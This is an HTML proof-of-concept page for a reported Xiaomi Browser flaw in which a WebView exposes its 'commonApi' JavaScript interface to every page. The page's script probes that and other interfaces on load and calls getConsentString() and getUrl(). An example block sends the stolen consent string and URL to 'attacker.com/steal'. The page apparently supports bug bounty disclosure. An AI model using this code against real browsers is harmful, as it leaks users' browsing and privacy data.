<!DOCTYPE html>
<html>
<head>
    <title>Xiaomi Browser - Information Disclosure PoC</title>
    <meta charset="UTF-8">
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 20px;
            min-height: 100vh;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
        }
        h1 {
            color: #667eea;
            text-align: center;
            margin-bottom: 10px;
        }
        .subtitle {
            text-align: center;
            color: #666;
            margin-bottom: 30px;
        }
        .result {
            background: #f0f0f0;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            border-left: 5px solid #667eea;
        }
        .vulnerable {
            background: #ffebee;
            border-left-color: #f44336;
        }
        .safe {
            background: #e8f5e9;
            border-left-color: #4caf50;
        }
        .code {
            background: #263238;
            color: #aed581;
            padding: 15px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            overflow-x: auto;
            margin: 15px 0;
        }
        .button {
            background: #667eea;
            color: white;
            border: none;
            padding: 12px 30px;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            margin: 10px 5px;
            transition: all 0.3s;
        }
        .button:hover {
            background: #5568d3;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }
        .status {
            display: inline-block;
            padding: 5px 15px;
            border-radius: 20px;
            font-weight: bold;
            margin: 10px 0;
        }
        .status.vuln {
            background: #f44336;
            color: white;
        }
        .status.safe {
            background: #4caf50;
            color: white;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        th {
            background: #667eea;
            color: white;
        }
        tr:hover {
            background: #f5f5f5;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üîç Xiaomi Browser</h1>
        <p class="subtitle">Information Disclosure Vulnerability Test</p>

        <div id="autoTestResult"></div>

        <div class="result">
            <h2>üéØ Vulnerability: JavaScript Interface Exposure</h2>
            <p><strong>File:</strong> SafeThreadWebView.java</p>
            <p><strong>Issue:</strong> <code>commonApi</code> interface exposed to ALL pages without origin validation</p>
            <p><strong>Severity:</strong> MEDIUM (Information Disclosure)</p>
            <p><strong>Bounty:</strong> $200 - $600</p>
        </div>

        <button class="button" onclick="testCommonApi()">üî¥ Test commonApi Interface</button>
        <button class="button" onclick="testInstantWeb()">üî¥ Test instantweb Interface</button>
        <button class="button" onclick="testAllInterfaces()">üî¥ Test All Interfaces</button>

        <div id="testResults"></div>

        <div class="result">
            <h3>üìä What This Test Does:</h3>
            <ol>
                <li>Checks if <code>window.commonApi</code> is exposed</li>
                <li>Attempts to call <code>getConsentString()</code> method</li>
                <li>Attempts to call <code>getUrl()</code> method</li>
                <li>Checks for other exposed interfaces</li>
                <li>If successful ‚Üí Browser is VULNERABLE to information disclosure</li>
            </ol>
        </div>

        <div class="result">
            <h3>üé¨ Expected Results:</h3>
            <table>
                <tr>
                    <th>Browser</th>
                    <th>Status</th>
                    <th>Result</th>
                </tr>
                <tr>
                    <td>Xiaomi Browser (Vulnerable)</td>
                    <td><span class="status vuln">VULNERABLE</span></td>
                    <td>Can access commonApi.getConsentString() and getUrl()</td>
                </tr>
                <tr>
                    <td>Chrome/Firefox/Safari</td>
                    <td><span class="status safe">SAFE</span></td>
                    <td>window.commonApi is undefined</td>
                </tr>
            </table>
        </div>

        <div class="result">
            <h3>üí∞ Bug Bounty Submission:</h3>
            <p>If this test shows VULNERABLE:</p>
            <ol>
                <li>Record video showing test results</li>
                <li>Show that attacker-controlled webpage can access sensitive data</li>
                <li>Demonstrate data exfiltration to attacker server</li>
                <li>Submit to: <a href="https://security.xiaomi.com" target="_blank">https://security.xiaomi.com</a></li>
                <li>Expected bounty: <strong>$200 - $600 USD</strong></li>
            </ol>
        </div>

        <div class="result">
            <h3>üîß Exploitation Example:</h3>
            <div class="code">// Attacker's webpage (http://attacker.com)
if (window.commonApi) {
    // Extract sensitive data
    const consentId = window.commonApi.getConsentString();
    const currentUrl = window.commonApi.getUrl();
    
    // Exfiltrate to attacker server
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify({
            consent: consentId,
            url: currentUrl,
            timestamp: Date.now()
        })
    });
    
    // Attacker now has:
    // - User's consent/privacy settings
    // - Current browsing URL (privacy leak)
    // - Can track user behavior
}</div>
        </div>

        <div class="result">
            <h3>üìù Technical Details:</h3>
            <p><strong>Vulnerable Code:</strong></p>
            <div class="code">// SafeThreadWebView.java - Line 62-67
private void addCommonJS() {
    getSettings().setJavaScriptEnabled(true);
    CommApi commApi = this.mCommApi;
    addJavascriptInterface(commApi, "commonApi");
    // ^^^ Exposed to ALL pages!
}</div>
            <p><strong>Impact:</strong></p>
            <ul>
                <li>ANY webpage (including http://) can access commonApi</li>
                <li>No origin validation performed</li>
                <li>Can extract consent string (privacy data)</li>
                <li>Can track user browsing behavior</li>
            </ul>
        </div>
    </div>

    <script>
        let findings = [];

        function log(message, isVuln = false) {
            findings.push({
                message: message,
                vulnerable: isVuln,
                timestamp: new Date().toLocaleTimeString()
            });
            console.log('[' + (isVuln ? 'VULN' : 'INFO') + '] ' + message);
        }

        function displayResults() {
            const resultsDiv = document.getElementById('testResults');
            
            if (findings.length === 0) {
                resultsDiv.innerHTML = '<div class="result"><p>No tests performed yet. Click a button above to start testing.</p></div>';
                return;
            }

            let html = '<div class="result"><h3>üî¨ Test Results:</h3>';
            
            findings.forEach(f => {
                const className = f.vulnerable ? 'vulnerable' : 'safe';
                html += `<div class="result ${className}">`;
                html += `<strong>[${f.timestamp}]</strong> ${f.message}`;
                html += '</div>';
            });
            
            html += '</div>';
            resultsDiv.innerHTML = html;
        }

        function testCommonApi() {
            findings = [];
            log('Testing window.commonApi interface...');
            
            try {
                if (typeof window.commonApi !== 'undefined') {
                    log('‚úó VULNERABLE: window.commonApi IS EXPOSED!', true);
                    
                    // Test getConsentString
                    try {
                        const consent = window.commonApi.getConsentString();
                        log(`‚úó VULNERABLE: commonApi.getConsentString() = "${consent}"`, true);
                        log('‚úó Attacker can extract consent/privacy data!', true);
                    } catch (e) {
                        log(`‚úì getConsentString() blocked: ${e.message}`);
                    }
                    
                    // Test getUrl
                    try {
                        const url = window.commonApi.getUrl();
                        log(`‚úó VULNERABLE: commonApi.getUrl() = "${url}"`, true);
                        log('‚úó Attacker can track browsing history!', true);
                    } catch (e) {
                        log(`‚úì getUrl() blocked: ${e.message}`);
                    }
                    
                    // Check for other methods
                    try {
                        const methods = Object.getOwnPropertyNames(Object.getPrototypeOf(window.commonApi));
                        log(`‚úó Available methods: ${methods.join(', ')}`, true);
                    } catch (e) {
                        log('Could not enumerate methods');
                    }
                    
                } else {
                    log('‚úì SAFE: window.commonApi not found (expected on non-Xiaomi browsers)');
                }
            } catch (e) {
                log(`Error during test: ${e.message}`);
            }
            
            displayResults();
        }

        function testInstantWeb() {
            log('Testing window.instantweb interface...');
            
            try {
                if (typeof window.instantweb !== 'undefined') {
                    log('‚úó VULNERABLE: window.instantweb IS EXPOSED!', true);
                    
                    // Test onPageLoadError
                    try {
                        window.instantweb.onPageLoadError(404);
                        log('‚úó VULNERABLE: instantweb.onPageLoadError() is callable!', true);
                    } catch (e) {
                        log(`‚úì onPageLoadError() blocked: ${e.message}`);
                    }
                    
                    // Check for other methods
                    try {
                        const methods = Object.getOwnPropertyNames(Object.getPrototypeOf(window.instantweb));
                        log(`‚úó Available methods: ${methods.join(', ')}`, true);
                    } catch (e) {
                        log('Could not enumerate methods');
                    }
                    
                } else {
                    log('‚úì SAFE: window.instantweb not found');
                }
            } catch (e) {
                log(`Error during test: ${e.message}`);
            }
            
            displayResults();
        }

        function testAllInterfaces() {
            findings = [];
            log('Scanning for ALL JavaScript interfaces...');
            
            const possibleInterfaces = [
                'commonApi',
                'instantweb',
                'android',
                'miuiBrowser',
                'xiaomiBrowser',
                'webkit',
                'MiWebView',
                'XiaomiAPI',
                'BrowserAPI'
            ];
            
            let foundCount = 0;
            
            possibleInterfaces.forEach(name => {
                if (typeof window[name] !== 'undefined') {
                    foundCount++;
                    log(`‚úó FOUND: window.${name} is exposed!`, true);
                    
                    try {
                        const type = typeof window[name];
                        log(`  Type: ${type}`, true);
                        
                        if (type === 'object' || type === 'function') {
                            const methods = Object.getOwnPropertyNames(window[name]);
                            log(`  Properties/Methods: ${methods.join(', ')}`, true);
                        }
                    } catch (e) {
                        log(`  Could not inspect ${name}`);
                    }
                }
            });
            
            if (foundCount === 0) {
                log('‚úì SAFE: No JavaScript interfaces found (expected on non-Xiaomi browsers)');
            } else {
                log(`‚úó CRITICAL: Found ${foundCount} exposed interface(s)!`, true);
                log('‚úó Browser is VULNERABLE to information disclosure!', true);
            }
            
            // Additional checks
            log('Checking browser info...');
            log(`User Agent: ${navigator.userAgent}`);
            log(`Platform: ${navigator.platform}`);
            log(`Current URL: ${window.location.href}`);
            log(`Origin: ${window.location.origin}`);
            
            displayResults();
        }

        // Auto-run test on page load
        window.addEventListener('load', () => {
            setTimeout(() => {
                const autoResult = document.getElementById('autoTestResult');
                
                if (typeof window.commonApi !== 'undefined' || typeof window.instantweb !== 'undefined') {
                    autoResult.innerHTML = `
                        <div class="result vulnerable">
                            <h2>‚ö†Ô∏è VULNERABILITY DETECTED!</h2>
                            <p><span class="status vuln">VULNERABLE</span></p>
                            <p>JavaScript interfaces are exposed on this page!</p>
                            <p><strong>This browser is vulnerable to information disclosure.</strong></p>
                            <p>Click buttons below for detailed test results.</p>
                        </div>
                    `;
                    
                    // Auto-run full test
                    testAllInterfaces();
                } else {
                    autoResult.innerHTML = `
                        <div class="result safe">
                            <h2>‚úì No Vulnerability Detected</h2>
                            <p><span class="status safe">SAFE</span></p>
                            <p>JavaScript interfaces not found (expected on non-Xiaomi browsers).</p>
                            <p>To test properly, open this page in <strong>Xiaomi Browser</strong>.</p>
                        </div>
                    `;
                }
            }, 500);
        });
    </script>
</body>
</html>
